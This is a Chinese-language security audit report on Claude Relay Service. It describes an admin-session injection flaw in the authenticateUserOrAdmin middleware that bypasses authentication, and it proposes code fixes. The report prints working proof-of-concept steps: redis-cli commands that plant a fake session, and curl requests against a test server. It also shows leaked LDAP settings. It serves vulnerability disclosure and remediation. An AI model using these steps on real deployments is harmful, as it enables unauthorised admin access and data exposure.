# Claude Relay Service 安全审计报告

**日期**: 2025-12-28
**审计目标**: Claude Relay Service v1.1.249
**严重程度**: 高

---

## 一、安全模型分析

### 1.1 Redis 不在安全边界内

通过代码审计发现，系统对存储在 Redis 中的敏感数据进行了 AES-256-CBC 加密处理：

```javascript
// src/services/claudeAccountService.js:53
this.ENCRYPTION_ALGORITHM = 'aes-256-cbc'

// 加密示例 (claudeAccountService.js:110-114)
accountData = {
  email: this._encryptSensitiveData(email),
  password: this._encryptSensitiveData(password),
  accessToken: this._encryptSensitiveData(claudeAiOauth.accessToken),
  refreshToken: this._encryptSensitiveData(claudeAiOauth.refreshToken),
  // ...
}
```

**这表明系统的安全模型假设 Redis 不可信** —— 即使攻击者获得了 Redis 的读写权限，也无法直接获取 OAuth 令牌等敏感凭据。

### 1.2 加密数据与未加密数据

然而，审计发现系统存在**安全模型不一致**的问题：

| 数据类型 | 是否加密 | Redis 键模式 |
|----------|----------|--------------|
| OAuth 令牌 | ✅ 加密 | `claude:account:*` |
| API 密钥 | ✅ 加密 | `gemini_api_account:*`, `azure_openai_account:*` |
| 刷新令牌 | ✅ 加密 | 各账户服务 |
| **管理员会话** | ❌ **未加密** | `session:*` |
| **用户会话** | ❌ **未加密** | `user_session:*` |
| **用户数据** | ❌ **未加密** | `user:*` |
| **Bedrock 凭据** | ❌ **未加密** | `bedrock_account:*` |

### 1.3 安全模型矛盾

```
┌─────────────────────────────────────────────────────────────┐
│                    安全模型矛盾                              │
├─────────────────────────────────────────────────────────────┤
│  加密数据 (假设 Redis 不可信)  │  未加密数据 (假设 Redis 可信) │
│  ─────────────────────────────│─────────────────────────────│
│  • OAuth accessToken          │  • 管理员会话 (session:*)    │
│  • OAuth refreshToken         │  • 用户会话 (user_session:*) │
│  • 账户密码                    │  • API Key 元数据           │
│  • 第三方 API 密钥             │  • Bedrock AWS 凭据         │
└─────────────────────────────────────────────────────────────┘
```

**结论**：如果 Redis 不可信（这是加密敏感数据的前提），那么未加密的会话数据就是一个严重的安全漏洞。

---

## 二、漏洞详情

### 2.1 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞名称** | 管理员会话注入导致认证绕过 |
| **影响组件** | `authenticateUserOrAdmin` 中间件 |
| **漏洞位置** | `src/middleware/auth.js:1569-1581` |
| **严重程度** | 高 |
| **CVSS 评分** | 8.1 (High) |

### 2.2 漏洞原因

系统存在两个认证中间件，但它们的安全检查不一致：

**`authenticateAdmin` (已修复，安全)**
```javascript
// src/middleware/auth.js:1384-1402
if (!adminSession || Object.keys(adminSession).length === 0) {
  return res.status(401).json({...})
}

// 🔒 安全修复：验证会话必须字段
if (!adminSession.username || !adminSession.loginTime) {
  await redis.deleteSession(token)  // 删除无效会话
  return res.status(401).json({...})
}
```

**`authenticateUserOrAdmin` (存在漏洞)**
```javascript
// src/middleware/auth.js:1569-1581
if (adminSession && Object.keys(adminSession).length > 0) {
  // ⚠️ 未验证必要字段！
  req.admin = {
    id: adminSession.adminId || 'admin',  // 使用可预测的默认值
    username: adminSession.username,       // 可能为 undefined
    sessionId: adminToken,
    loginTime: adminSession.loginTime      // 可能为 undefined
  }
  req.userType = 'admin'
  return next()  // 直接放行！
}
```

**问题根因**：
1. `authenticateAdmin` 在安全修复后会验证 `username` 和 `loginTime` 字段
2. `authenticateUserOrAdmin` **没有同步应用这个修复**
3. 只要会话对象非空（有任意字段），就会通过认证

### 2.3 触发条件

攻击者需要具备 Redis 写入权限（与加密敏感数据的安全模型一致）。

**攻击步骤**：

```bash
# 步骤 1：在 Redis 中注入一个最小化的恶意会话
redis-cli HSET "session:attacker_token_123" "foo" "bar"
redis-cli EXPIRE "session:attacker_token_123" 3600

# 步骤 2：使用该令牌访问受保护的管理接口
curl -X GET "https://target.example.com/users/" \
  -H "Authorization: Bearer attacker_token_123"
```

**攻击原理**：
1. 注入的会话 `{foo: 'bar'}` 只有一个无关字段
2. `Object.keys(session).length > 0` 检查通过（长度为 1）
3. `req.admin` 被设置，其中 `username` 和 `loginTime` 为 `undefined`
4. 后续的 `requireAdmin` 中间件只检查 `if (req.admin)` —— 对象存在即通过
5. 攻击者获得管理员权限

### 2.4 影响范围

使用 `authenticateUserOrAdmin` 中间件的所有端点都受影响：

| 端点 | 方法 | 功能 | 危害 |
|------|------|------|------|
| `/users/` | GET | 列出所有用户 | 信息泄露 |
| `/users/:userId` | GET | 获取用户详情 | 信息泄露 |
| `/users/:userId/status` | PATCH | 修改用户状态 | 权限提升 |
| `/users/:userId/role` | PATCH | 修改用户角色 | 权限提升 |
| `/users/:userId/disable-keys` | POST | 禁用用户 API Key | 拒绝服务 |
| `/users/:userId/usage-stats` | GET | 查看使用统计 | 信息泄露 |
| `/users/stats/overview` | GET | 系统统计概览 | 信息泄露 |
| `/users/admin/ldap-test` | GET | LDAP 配置测试 | 配置泄露 |

### 2.5 实际验证

在测试服务器上成功复现此漏洞：

```bash
# 注入恶意会话
$ redis-cli HSET "session:vuln_test_token_12345" "randomField" "test_value"
(integer) 1

# 访问管理接口
$ curl -s "https://claude.chapoly1305.com/users/" \
    -H "Authorization: Bearer vuln_test_token_12345"

# 返回结果（应返回 401，实际返回 200）
{"success":true,"users":[],"pagination":{"total":0,"page":1,"limit":20,"totalPages":0}}
```

**LDAP 配置泄露**：
```bash
$ curl -s "https://claude.chapoly1305.com/users/admin/ldap-test" \
    -H "Authorization: Bearer vuln_test_token_12345"

# 泄露的敏感信息
{
  "url": "ldaps://ldap-1.test1.bj.yxops.net:636",
  "searchBase": "dc=example,dc=com",
  "searchFilter": "(uid={{username}})"
}
```

---

## 三、修复建议

### 3.1 短期修复

在 `authenticateUserOrAdmin` 中添加与 `authenticateAdmin` 一致的字段验证：

```javascript
// src/middleware/auth.js:1569 后添加
if (adminSession && Object.keys(adminSession).length > 0) {
  // 🔒 安全修复：验证会话必须字段（与 authenticateAdmin 保持一致）
  if (!adminSession.username || !adminSession.loginTime) {
    logger.security(
      `🔒 Corrupted admin session in authenticateUserOrAdmin from ${req.ip}`
    )
    await redis.deleteSession(adminToken)
    // 不返回，继续尝试用户认证
  } else {
    req.admin = {
      id: adminSession.adminId || `admin_${Date.now()}`,  // 避免可预测的默认值
      username: adminSession.username,
      sessionId: adminToken,
      loginTime: adminSession.loginTime
    }
    req.userType = 'admin'
    return next()
  }
}
```

### 3.2 长期修复

统一安全模型，确保所有存储在 Redis 中的敏感数据都得到保护：

1. **会话数据签名**：使用 HMAC 对会话数据签名，防止篡改
2. **会话数据加密**：与 OAuth 令牌一样加密存储
3. **升级加密算法**：从 AES-256-CBC 升级到 AES-256-GCM（自带认证）
4. **Bedrock 凭据加密**：修复 `bedrockAccountService.js` 中未加密存储 AWS 凭据的问题

---

## 四、总结

| 项目 | 状态 |
|------|------|
| 漏洞类型 | 认证绕过 |
| 前提条件 | Redis 写入权限 |
| 与安全模型一致性 | ✅ 是（加密数据暗示 Redis 不可信） |
| 已验证 | ✅ 在测试服务器上复现成功 |
| 修复难度 | 低（约 10 行代码） |
| 建议优先级 | 高 |

---

**报告完成**
